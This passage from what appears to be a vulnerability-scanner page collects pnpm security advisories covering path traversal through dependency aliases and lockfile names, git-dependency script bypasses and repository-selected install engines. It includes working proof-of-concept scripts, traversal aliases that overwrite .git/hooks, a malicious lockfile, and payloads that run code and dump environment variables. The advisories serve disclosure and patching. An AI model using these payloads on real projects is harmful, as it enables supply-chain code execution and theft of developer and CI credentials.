- `node_modules/.bin` or undeclared `node_modules/<name>` paths used by later
  command or module resolution

Targets that are regular files can also be replaced with symlinks to a package directory, but those cases are usually denial of service. Directory targets are more useful because many developer tools execute or load files from those directories after installation.

This was reproduced with `pnpm@11.2.1`.

## Impact

Users often run `pnpm install --ignore-scripts` expecting that untrusted package code cannot execute during installation. This issue bypasses that expectation: the malicious package does not need a lifecycle script. Instead, it silently rewires project files or directories during install, and the payload runs when the user or CI later executes another normal command.

Examples include `git commit`, `pnpm test`, `pnpm run build`, a CI step that uses a local GitHub Action, or `pnpm publish` packaging a replaced `dist/` directory. In this PoC, the victim installs a normal registry package, the transitive malicious package replaces `.git/hooks`, and the payload runs when the victim later executes `git commit`.

## Root Cause

pnpm preserves dependency alias names from package metadata and later passes those aliases into dependency linking as path components. The alias is joined with the destination `node_modules` directory and passed to the symlink creation logic without rejecting `..` segments or checking that the normalized result stays inside the intended `node_modules` directory.

Conceptually, a transitive alias like this:

```json
{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
```

is eventually treated like:

```text
path.join(parentPackageNodeModulesDir, "@x/../../../../../.git/hooks")
```

The normalized destination escapes the dependency's `node_modules` directory and lands at the victim project's `.git/hooks` path. pnpm then creates a symlink at that escaped destination to the resolved `payload-hooks` package directory.

The dependency chain is:

```text
victim installs normal@1.0.0
normal@1.0.0 -> bad@1.0.0
bad@1.0.0 -> payload-hooks@1.0.0 through a traversal alias
```

The malicious transitive package metadata contains:

```json
{
  "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
}
```

Because this uses an `npm:` registry alias, it does not rely on a transitive `file:` or `link:` dependency.

## Proof Of Concept

Run:

```sh
./run.sh
```

``` sh
#!/bin/sh
set -eu

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORKDIR="$SCRIPT_DIR/demo-workdir"
REGISTRY_DIR="$WORKDIR/registry"
TARBALLS_DIR="$REGISTRY_DIR/tarballs"
VICTIM_DIR="$WORKDIR/victim"
READY_FILE="$WORKDIR/registry-ready"
PORT_FILE="$WORKDIR/registry-port"

rm -rf "$WORKDIR"
mkdir -p "$REGISTRY_DIR/payload-hooks" "$REGISTRY_DIR/bad" "$REGISTRY_DIR/normal" "$TARBALLS_DIR" "$VICTIM_DIR"

cat > "$REGISTRY_DIR/payload-hooks/package.json" <<'JSON'
{
  "name": "payload-hooks",
  "version": "1.0.0",
  "bin": {
    "pre-commit": "pre-commit"
  },
  "files": [
    "pre-commit"
  ]
}
JSON

cat > "$REGISTRY_DIR/payload-hooks/pre-commit" <<'EOF'
#!/bin/sh
echo PWNED >&2
exit 0
EOF
chmod +x "$REGISTRY_DIR/payload-hooks/pre-commit"

cat > "$REGISTRY_DIR/bad/package.json" <<'JSON'
{
  "name": "bad",
  "version": "1.0.0",
  "description": "transitive registry package",
  "dependencies": {
    "@x/../../../../../.git/hooks": "npm:payload-hooks@1.0.0"
  }
}
JSON

cat > "$REGISTRY_DIR/normal/package.json" <<'JSON'
{
  "name": "normal",
  "version": "1.0.0",
  "description": "normal looking package from a registry",
  "dependencies": {
    "bad": "1.0.0"
  }
}
JSON

(cd "$REGISTRY_DIR/payload-hooks" && npm pack --pack-destination "$TARBALLS_DIR" --silent >/dev/null)
(cd "$REGISTRY_DIR/bad" && npm pack --pack-destination "$TARBALLS_DIR" --silent >/dev/null)
(cd "$REGISTRY_DIR/normal" && npm pack --pack-destination "$TARBALLS_DIR" --silent >/dev/null)

node - "$REGISTRY_DIR" "$READY_FILE" "$PORT_FILE" <<'NODE' &
const http = require('node:http')
const fs = require('node:fs')
const path = require('node:path')
const { execFileSync } = require('node:child_process')

const [registryDir, readyFile, portFile] = process.argv.slice(2)
const tarballsDir = path.join(registryDir, 'tarballs')

function shasum (filename) {
  return execFileSync('openssl', ['dgst', '-sha1', path.join(tarballsDir, filename)])
    .toString()
    .trim()
    .split(/\s+/)
    .pop()
}

function integrity (filename) {
  return 'sha512-' + execFileSync('openssl', ['dgst', '-sha512', '-binary', path.join(tarballsDir, filename)])
    .toString('base64')
}

function packument (pkgName, req) {
  const filename = `${pkgName}-1.0.0.tgz`
  const manifest = JSON.parse(fs.readFileSync(path.join(registryDir, pkgName, 'package.json'), 'utf8'))
  const origin = `http://${req.headers.host}`
  return {
    name: pkgName,
    'dist-tags': {
      latest: '1.0.0',
    },
    versions: {
      '1.0.0': {
        ...manifest,
        dist: {
          tarball: `${origin}/${pkgName}/-/${filename}`,
          shasum: shasum(filename),
          integrity: integrity(filename),
        },
      },
    },
  }
}

const server = http.createServer((req, res) => {
  const pathname = new URL(req.url, 'http://local.invalid').pathname
  if (req.method !== 'GET') {
    res.writeHead(405)
    res.end('method not allowed')
    return
  }
  if (pathname === '/normal' || pathname === '/bad' || pathname === '/payload-hooks') {
    const pkgName = pathname.slice(1)
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify(packument(pkgName, req)))
    return
  }
  const tarballMatch = pathname.match(/^\/(normal|bad|payload-hooks)\/-\/(.+\.tgz)$/)
  if (tarballMatch) {
    const file = path.join(tarballsDir, tarballMatch[2])
    res.writeHead(200, { 'content-type': 'application/octet-stream' })
    fs.createReadStream(file).pipe(res)
    return
  }
  res.writeHead(404)
  res.end('not found')
})

server.listen(0, '127.0.0.1', () => {
  fs.writeFileSync(portFile, String(server.address().port))
  fs.writeFileSync(readyFile, 'ready')
})
NODE
REGISTRY_PID=$!
trap 'kill "$REGISTRY_PID" 2>/dev/null || true' EXIT INT TERM

WAIT_COUNT=0
while [ ! -f "$READY_FILE" ]; do
  WAIT_COUNT=$((WAIT_COUNT + 1))
  if [ "$WAIT_COUNT" -gt 100 ]; then
    echo "local registry did not start" >&2
    exit 1
  fi
  sleep 0.05
done
REGISTRY_PORT=$(cat "$PORT_FILE")

cd "$VICTIM_DIR"
git init -q
git config user.email demo@example.invalid
git config user.name "Demo User"

cat > package.json <<'JSON'
{
  "name": "victim",
  "version": "1.0.0"
}
JSON

cat > .npmrc <<EOF
registry=http://127.0.0.1:$REGISTRY_PORT/
EOF

printf 'pnpm: '
pnpm --version
printf 'registry: http://127.0.0.1:%s/\n' "$REGISTRY_PORT"
printf 'victim: %s\n\n' "$VICTIM_DIR"

pnpm install normal@1.0.0 --ignore-scripts --config.confirmModulesPurge=false --reporter=silent

echo 'trigger commit' > change.txt
git add change.txt

set +e
COMMIT_STDERR=$(git commit -m 'trigger pre-commit' 2>&1 >/dev/null)
COMMIT_STATUS=$?
set -e

printf '\ngit commit exit code: %s\n' "$COMMIT_STATUS"
printf 'git commit stderr:\n%s\n' "$COMMIT_STDERR"

```

The script starts a local npm-compatible registry, writes a victim project `.npmrc` that points to that registry, installs `normal@1.0.0` with `--ignore-scripts`, and then triggers `git commit`.

Requirements:

```text
pnpm
npm
node
git
openssl
```

Expected output:

```text
git commit exit code: 0
git commit stderr:
PWNED
```

`PWNED` is printed by the attacker-controlled `pre-commit` hook from the `payload-hooks` package.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69264?s=github&n=pnpm&t=npm&vr=%3E%3D10.0.0%2C%3C10.26.0"><img alt="high 8.8: CVE--2025--69264" src="https://img.shields.io/badge/CVE--2025--69264-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Protection Mechanism Failure</i>

<table>
<tr><td>Affected range</td><td><code>>=10.0.0<br/><10.26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>10.26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

# pnpm v10+ Git Dependency Script Execution Bypass

### Summary

A security bypass vulnerability in pnpm v10+ allows git-hosted dependencies to execute arbitrary code during `pnpm install`, circumventing the v10 security feature "Dependency lifecycle scripts execution disabled by default". While pnpm v10 blocks `postinstall` scripts via the `onlyBuiltDependencies` mechanism, git dependencies can still execute `prepare`, `prepublish`, and `prepack` scripts during the fetch phase, enabling remote code execution without user consent or approval.

### Details

pnpm v10 introduced a security feature to disable dependency lifecycle scripts by default ([PR #8897](https://github.com/pnpm/pnpm/pull/8897)). This is implemented by setting `onlyBuiltDependencies = []` when no build policy is configured:

**File:** `pkg-manager/core/src/install/extendInstallOptions.ts` (lines 290-291)
```typescript
if (opts.neverBuiltDependencies == null && opts.onlyBuiltDependencies == null && opts.onlyBuiltDependenciesFile == null) {
  opts.onlyBuiltDependencies = []
}
```

This creates an allowlist that blocks all packages from running scripts during the **BUILD phase** in `exec/build-modules/src/index.ts`.

However, git-hosted dependencies are processed differently. During the **FETCH phase**, git packages are prepared using `preparePackage()`:

**File:** `exec/prepare-package/src/index.ts` (lines 28-57)
```typescript
export async function preparePackage (opts: PreparePackageOptions, gitRootDir: string, subDir: string) {
  // ...
  if (opts.ignoreScripts) return { shouldBeBuilt: true, pkgDir }  // Only checks ignoreScripts, not onlyBuiltDependencies

  const execOpts: RunLifecycleHookOptions = {
    // ...
    rawConfig: omit(['ignore-scripts'], opts.rawConfig),  // Explicitly removes ignore-scripts!
  }

  // Runs npm/pnpm install
  await runLifecycleHook(installScriptName, manifest, execOpts)

  // Runs prepare scripts
  for (const scriptName of PREPUBLISH_SCRIPTS) {  // ['prepublish', 'prepack', 'publish']
    await runLifecycleHook(newScriptName, manifest, execOpts)
  }
}
```

The `ignoreScripts` option defaults to `false` and is completely separate from `onlyBuiltDependencies`. The `onlyBuiltDependencies` allowlist is never consulted during the fetch phase.

**Affected scripts that execute during fetch:**
- `prepare`
- `prepublish`
- `prepack`

**Attack vectors:**
- `git+https://github.com/attacker/malicious.git`
- `github:attacker/malicious`
- `gitlab:attacker/malicious`
- `bitbucket:attacker/malicious`
- `git+ssh://git@github.com/attacker/malicious.git`
- `git+file:///path/to/local/repo`

### PoC

**Prerequisites:**
- pnpm v10.0.0 or later (tested on v10.23.0 and v11.0.0-alpha.1)
- git

**Steps to reproduce:**

1. Extract the attached [poc.zip](https://github.com/user-attachments/files/23797816/poc.zip)

2. Run the PoC script:
   ```bash
   cd poc
   chmod +x run-poc.sh
   ./run-poc.sh
   ```

3. Verify the marker file was created by the malicious script:
   ```bash
   cat /tmp/pnpm-vuln-poc-marker.txt
   ```

**Manual reproduction:**

1. Create a malicious package with a `prepare` script:
   ```json
   {
     "name": "malicious-pkg",
     "version": "1.0.0",
     "scripts": {
       "prepare": "node -e \"require('fs').writeFileSync('/tmp/pwned.txt', 'RCE!')\""
     }
   }
   ```

2. Initialize it as a git repo and commit the files

3. Create a victim project that depends on it (just have to make sure it actually git clones and not just downloads a tarball):
   ```json
   {
     "dependencies": {
       "malicious-pkg": "git+file:///path/to/malicious-pkg"
     }
   }
   ```

4. Run `pnpm install` - the prepare script executes without any warning or approval prompt

### Impact

**Severity: High**

**Who is impacted:**
- All pnpm v10+ users
- Users who believed they were protected by the v10 "scripts disabled by default" feature
- CI/CD pipelines

**Attack scenarios:**
1. **Supply chain attack:** An attacker compromises a dependency, adding to it a malicious git dependency that executes arbitrary code during `pnpm install`

**What an attacker can do:**
- Execute arbitrary code with the victim's privileges
- Exfiltrate environment variables, secrets, and credentials
- Modify source code or inject backdoors
- Establish persistence or reverse shells
- Access the filesystem and network

**Why this bypasses security expectations:**
- pnpm v10 changelog explicitly states "Lifecycle scripts of dependencies are not executed during installation by default"
- Users expect git dependencies to follow the same security model as npm registry packages
- There is no warning that git dependencies are treated differently
- The `onlyBuiltDependencies` configuration does not affect git dependencies

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-qrv3-253h-g69c?s=github&n=pnpm&t=npm&vr=%3C10.34.4"><img alt="high 8.2: GHSA--qrv3--253h--g69c" src="https://img.shields.io/badge/GHSA--qrv3--253h--g69c-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><10.34.4</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

`pnpm` accepts package names from the env lockfile `configDependencies` section and uses those names directly when creating config dependency symlinks under `node_modules/.pnpm-config`.

A malicious repository can commit a crafted `pnpm-lock.yaml` whose env-lockfile document contains a traversal-shaped config dependency name such as `../../PWNED_CFGDEP`. During `pnpm install`, pnpm installs the config dependency and creates a symlink at a path derived from that name.

In local testing against pnpm `v11.5.1`, this caused pnpm to create a symlink outside the intended config dependency directory:

```text
expected root: /tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
actual path:   /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
```

This works with `--ignore-scripts`, so it does not rely on lifecycle script execution.

## Vulnerable behavior

The vulnerable behavior appears to be that `configDependencies` keys from the env lockfile are trusted as package names and used in filesystem paths without rejecting traversal components.

The relevant pattern is:

```ts
const configModulesDir = path.join(opts.rootDir, 'node_modules/.pnpm-config')

for (const [pkgName, pkg] of Object.entries(normalizedDeps)) {
  const configDepPath = path.join(configModulesDir, pkgName)

  const pkgDirInGlobalVirtualStore = path.join(
    globalVirtualStoreDir,
    relPath,
    'node_modules',
    pkgName
  )

  await symlinkDir(pkgDirInGlobalVirtualStore, configDepPath)
}
```

If `pkgName` is attacker-controlled and contains `..`, then `path.join(configModulesDir, pkgName)` can resolve outside `node_modules/.pnpm-config`.

## Impact

A malicious project can cause pnpm to create symlinks outside the intended `node_modules/.pnpm-config` directory during install.

This gives an attacker a filesystem write primitive in the victim project directory, and potentially outside it with deeper traversal payloads, depending on path permissions and platform behavior.

The issue is especially relevant because:

* The malicious input is committed in `pnpm-lock.yaml`.
* The issue is triggered during `pnpm install`.
* It works with `--ignore-scripts`.
* It occurs in the config dependency installation path, before ordinary dependency installation.
* The user only needs to install a malicious or compromised repository.

## Local proof of concept

The following local-only PoC creates a temporary project, starts a local fake registry on `127.0.0.1`, writes a malicious env-lockfile entry, runs pnpm, and checks whether pnpm created a symlink outside `node_modules/.pnpm-config`.

Command used:

```bash
python3 ../pnpm_configdeps_path_traversal_poc.py \
  --pnpm-cmd "node /home/ethical/pnpm-main/pnpm/bin/pnpm.cjs" \
  --keep 2>&1 | tee /tmp/pnpm-configdeps-poc.log
```

Observed output:

```text
[+] Test project:       /tmp/pnpm-cfgdep-poc-sznwgunx/victim
[+] Local registry:     http://127.0.0.1:36545/
[+] Store dir:          /tmp/pnpm-cfgdep-poc-sznwgunx/store
[+] Malicious name:     '../../PWNED_CFGDEP'
[+] Intended cfg root:  /tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
[+] Traversal sink:     /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
[+] Lockfile written:   /tmp/pnpm-cfgdep-poc-sznwgunx/victim/pnpm-lock.yaml
[+] Running: node /home/ethical/pnpm-main/pnpm/bin/pnpm.cjs install --ignore-scripts --config.confirmModulesPurge=false --reporter=append-only --store-dir /tmp/pnpm-cfgdep-poc-sznwgunx/store --registry http://127.0.0.1:36545/
```

pnpm output:

```text
Installing config dependencies...
Installed config dependencies: ../../PWNED_CFGDEP@1.0.0, legit-config-dep@1.0.0
Already up to date

Done in 906ms using pnpm v11.5.1
```

The PoC then detected the escaped symlink:

```text
[+] Traversal sink status: symlink -> ../store/v11/PWNED_CFGDEP/1.0.0/PWNED_CFGDEP

[VULNERABLE] pnpm created/modified a path derived from a lockfile package name outside node_modules/.pnpm-config
            sink = /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
            readlink = ../store/v11/PWNED_CFGDEP/1.0.0/PWNED_CFGDEP
```

## Malicious lockfile structure

The malicious input is an env-lockfile `configDependencies` key containing traversal components:

```yaml
importers:
  .:
    configDependencies:
      legit-config-dep:
        specifier: '1.0.0'
        version: '1.0.0'
      '../../PWNED_CFGDEP':
        specifier: '1.0.0'
        version: '1.0.0'
```

pnpm accepts the traversal-shaped name and reports it as installed:

```text
Installed config dependencies: ../../PWNED_CFGDEP@1.0.0, legit-config-dep@1.0.0
```

## Security boundary violation

The intended config dependency root was:

```text
/tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
```

But pnpm created:

```text
/tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
```

This demonstrates that a config dependency name from the lockfile can escape the directory where config dependencies should be linked.

## Suggested remediation

Validate every `configDependencies` key loaded from the env lockfile before using it as a package name or path component.

Recommended fixes:

1. Reject env-lockfile `configDependencies` names that are not valid npm package names.
2. Reject names containing absolute paths, `.` components, `..` components, backslashes, or platform-specific path separators.
3. Use containment-checked path joining before creating symlinks:

   * resolve the final destination path,
   * verify it remains inside `node_modules/.pnpm-config`,
   * reject if it escapes.
4. Apply the same validation to config dependency subdependencies and optional dependency names read from the env lockfile.
5. Intersect env-lockfile `configDependencies` with the effective `pnpm-workspace.yaml` `configDependencies` before installing, so extra lockfile-only entries are rejected.

A safe destination check should enforce behavior equivalent to:

```ts
const dest = path.resolve(configModulesDir, pkgName)

if (!dest.startsWith(path.resolve(configModulesDir) + path.sep)) {
  throw new Error(`Invalid config dependency name: ${pkgName}`)
}
```

Name validation should happen before this check, not instead of it.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-55697?s=github&n=pnpm&t=npm&vr=%3C10.34.2"><img alt="high 7.5: CVE--2026--55697" src="https://img.shields.io/badge/CVE--2026--55697-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Download of Code Without Integrity Check</i>

<table>
<tr><td>Affected range</td><td><code><10.34.2</code></td></tr>
<tr><td>Fixed version</td><td><code>11.5.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.127%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

<!-- maintainer-action:start -->
## Maintainer Action Plan

This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.

- Advisory: `CAND-PNPM-097` / `GHSA-gj8w-mvpf-x27x`
- Advisory URL: https://github.com/pnpm/pnpm/security/advisories/GHSA-gj8w-mvpf-x27x
- Shared patch PR: https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1
- Shared patch branch: `security/ghsa-batch-2026-06-09`
- Patch commit: `a93449314f398cf4bdf2e28d033c02d37395ad22`
- Base commit: `origin/main` `55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec`
- Maintainer priority: `start-here`
- Component: `pnpm configDependencies / pacquet delegation`
- Patch area: pacquet/configDependency lifecycle execution is not used as install engine without trust
- Affected packages: `npm:pnpm`, `npm:@pnpm/config.reader`, `npm:@pnpm/installing.commands`
- CWE IDs: `CWE-829`, `CWE-78`, `CWE-494`
- Conservative CVSS: `7.5` / `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.

### Expected Patched Behavior

config-dependency pacquet install engines are not selected unless the trusted allowlist is set outside the repository; the marker file is not created.

### Files And Tests To Review

- `config/reader/src/Config.ts`
- `config/reader/src/types.ts`
- `config/reader/src/configFileKey.ts`
- `config/reader/src/index.ts`
- `config/reader/test/index.ts`
- `installing/commands/src/installDeps.ts`
- `installing/commands/test/runPacquet.ts`
- `pnpm/test/install/pacquet.ts`
- `.changeset/lucky-config-plugin-pnpmfiles.md`

### Focused Validation

Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.

```bash
./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
```

The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is `results/CAND-PNPM-097-patched-result.json`.
<!-- maintainer-action:end -->

### Summary

pnpm can install `configDependencies` declared in `pnpm-workspace.yaml` before command dispatch. Before the patch, a repository could declare `pacquet` or `@pnpm/pacquet` as a config dependency and pnpm treated that repository-controlled dependency as an install-engine opt-in. During install, pnpm resolved a platform-specific `@pacquet/<platform>-<arch>/pacquet` binary from `node_modules/.pnpm-config/<packageName>` and spawned it as the developer or CI user.

### Details

The vulnerable source-to-sink path was:

- `config/reader/src/getOptionsFromRootManifest.ts` copies repository `pnpm-workspace.yaml` `configDependencies` into config.
- `pnpm/src/getConfig.ts` installs config dependencies before command dispatch.
- `installing/env-installer/src/resolveAndInstallConfigDeps.ts` resolves the repository-declared dependency and its optional platform subdependencies.
- `installing/env-installer/src/installConfigDeps.ts` fetches, imports, and symlinks the config dependency tree under `node_modules/.pnpm-config`.
- `installing/commands/src/installDeps.ts` selected pacquet delegation whenever `configDependencies` contained `pacquet` or `@pnpm/pacquet`.
- `installing/deps-installer/src/install/index.ts` called `opts.runPacquet` from frozen and materialization paths.
- `installing/commands/src/runPacquet.ts` resolved `@pacquet/${process.platform}-${process.arch}/pacquet` from the installed config dependency package and executed it with `spawn()`.

Exact-version, integrity, and platform filters only proved which bytes package resolution selected; they did not establish that the repository was trusted to choose a native install engine.

### PoC

Standalone PoC and verification script:

Repository fixture:

```yaml
packages:
  - .
configDependencies:
  pacquet: 0.2.2
```

Registry package shape:

```json
{
  "name": "pacquet",
  "version": "0.2.2",
  "optionalDependencies": {
    "@pacquet/darwin-arm64": "0.2.2"
  }
}
```

Platform package payload:

```sh
#!/bin/sh
echo "$PWD" > /tmp/pacquet-engine-ran
env > /tmp/pacquet-engine-env
```

Pre-patch exploit model:

1. The victim runs a dependency-management command such as `pnpm install` in the repository.
2. pnpm installs the repository-declared config dependency and its host-compatible optional platform dependency into `.pnpm-config`.
3. `installDeps()` treats the presence of `configDependencies.pacquet` or `configDependencies["@pnpm/pacquet"]` as authorization to delegate install materialization.
4. `runPacquet()` resolves the platform binary from the installed config dependency tree and spawns it in the lockfile directory.

Observed PoC output:

```json
{
  "primitive": "repository-selected pacquet config dependency reaches native process execution when selected",
  "patchedWithoutAllowlist": "blocked",
  "trustedAllowlist": "allows explicit opt-in"
}
```

Focused validation commands:

```bash
./node_modules/.bin/tsgo --build config/reader/tsconfig.json
./node_modules/.bin/tsgo --build installing/commands/tsconfig.json
./node_modules/.bin/tsgo --build pnpm/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/runPacquet.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "config dependency code allowlists|user-level preference settings" --runInBand
./node_modules/.bin/eslint config/reader/src/Config.ts config/reader/src/types.ts config/reader/src/configFileKey.ts config/reader/src/index.ts config/reader/test/index.ts installing/commands/src/installDeps.ts installing/commands/test/runPacquet.ts pnpm/test/install/pacquet.ts
git diff --check
```

Validation result:

- The PoC confirmed a selected pacquet config dependency reaches native process execution.
- Patched `getPacquetConfigDependencyName()` returns `undefined` without a trusted allowlist.
- Patched `getPacquetConfigDependencyName()` allows exact `pacquet`, exact `@pnpm/pacquet`, and wildcard `*` trusted opt-in.
- Config reader regressions prove user/global config can set `configDependencyInstallEngineAllowlist`, while `pnpm-workspace.yaml` cannot grant this permission to itself.
- E2E fixtures that intentionally delegate to pacquet now pass the trusted allowlist through environment config.
- TypeScript builds passed for `@pnpm/config.reader`, `@pnpm/installing.commands`, and `pnpm`.
- Focused `installing/commands/test/runPacquet.ts`: 3 passed.
- Focused `config/reader/test/index.ts`: 2 passed, 132 skipped under the focused pattern.
- ESLint passed with warnings only for existing skipped tests in `config/reader/test/index.ts` and `pnpm/test/install/pacquet.ts`.
- `git diff --check`: passed.

### Impact

A malicious repository can cause pnpm to execute a registry-selected native binary while handling dependency-management commands. The binary runs with the victim developer or CI user's filesystem, environment, registry credentials, git/SSH credentials, and network access.

## Affected products

Ecosystem: npm

Package name: `pnpm`, `@pnpm/config.reader`, `@pnpm/installing.commands`

Affected versions: current main before this patch, when `configDependencies` contains `pacquet` or `@pnpm/pacquet` and install paths delegate to pacquet.

Patched versions: 10.34.2, 11.5.3.

## Severity

Severity: High

Vector string: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

Base score: 8.8

Rationale: attacker input is delivered through a repository and registry package, exploitation is low complexity once the victim runs pnpm, no attacker privileges are required, and user interaction is required. Successful exploitation executes a native binary in the victim user's context, with high confidentiality, integrity, and availability impact.

## Weaknesses

CWE-829: Inclusion of Functionality from Untrusted Control Sphere

CWE-78: Improper Neutralization of Special Elements used in an OS Command

CWE-494: Download of Code Without Integrity Check

## Patch

The patch adds a trusted opt-in gate for config-dependency install-engine delegation:

- New setting: `configDependencyInstallEngineAllowlist`.
- The allowlist can be set from trusted user-controlled config such as global config, CLI config, or environment config.
- `pnpm-workspace.yaml` cannot grant this permission to itself; workspace-provided values are discarded after workspace settings are merged.
- `installDeps()` delegates to pacquet only when `pacquet`, `@pnpm/pacquet`, or `*` is present in the trusted allowlist.
- Repositories can still install `pacquet` as a config dependency, but pnpm will not spawn it as an install engine unless trusted config opts in.
- Existing tests that intentionally exercise pacquet delegation were updated to pass the trusted allowlist via environment config.

Changed files:

- `config/reader/src/Config.ts`
- `config/reader/src/types.ts`
- `config/reader/src/configFileKey.ts`
- `config/reader/src/index.ts`
- `config/reader/test/index.ts`
- `installing/commands/src/installDeps.ts`
- `installing/commands/test/runPacquet.ts`
- `pnpm/test/install/pacquet.ts`

Changeset:

- `.changeset/lucky-config-plugin-pnpmfiles.md`

Pacquet parity:

No pacquet-side code-execution sink exists for this finding. The Rust port parses and records `configDependencies` for workspace-state compatibility, but it does not install config dependencies or select/spawn an alternate install engine from them. The user-visible trust setting is TypeScript-side today because it gates pnpm's pacquet delegation path.

## CVSS Reassessment

Initial CVSS remains correct for vulnerable versions: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` / 8.8 High.

Final CVSS after patch: not vulnerable after patch / 0.0. The PoC no longer reaches pacquet install-engine selection or native process execution unless the victim has set a trusted allowlist outside the repository's own workspace settings.

## Remaining Risk

Users can explicitly trust pacquet install-engine delegation through the new allowlist. That is intentional behavior; the closed issue is repository self-authorization of a registry-provided native install engine.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-55487?s=github&n=pnpm&t=npm&vr=%3C10.34.2"><img alt="high 7.5: CVE--2026--55487" src="https://img.shields.io/badge/CVE--2026--55487-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Origin Validation Error</i>

<table>
<tr><td>Affected range</td><td><code><10.34.2</code></td></tr>
<tr><td>Fixed version</td><td><code>10.34.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.118%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

Keep build approval for opaque dependency sources byte-exact for GHSA-5wx6-mg75-v57r / CAND-PNPM-123.

Merged upstream commit `bf1b731ee6` fixed the original name-only approval bypass by making build policy consume the resolved dependency identity. One collision remained: the generic peer-suffix normalizer also stripped parenthesized text from git, URL, tarball, file, and other opaque locators. Approval for one source string could therefore authorize a different attacker-controlled source whose locator normalized to the same value.

## Security boundary

- Registry dependency identities still normalize legitimate peer suffixes and retain patch hashes.
- Git, URL, tarball, file, directory, and otherwise opaque identities must match the complete resolved locator byte for byte.
- Explicit denials use the same normalization as approvals.
- Ignored-build output preserves the exact opaque identity, so the key pnpm asks a user to approve is the key policy later checks.
- TypeScript pnpm and pacquet implement the same distinction between registry and opaque identities.

## Exploit replay

- With `allowBuilds` approving `foo@https://host/pkg.tgz`, the upstream implementation also accepted `foo@https://host/pkg.tgz(evil)` because both passed through peer-suffix removal.
- An independent review found a second Rust-only form: `foo@https://host/pkg@1.0.0(good)` and `foo@https://host/pkg@1.0.0(evil)` collided because the parser selected the final `@` and misclassified the opaque URL as a registry package.
- A final review found the same parser hazard in source-only locators ending in a semver-looking tail: approval for `https://host/pkg@1.0.0` could collapse `https://host/pkg@1.0.0(evil)`.
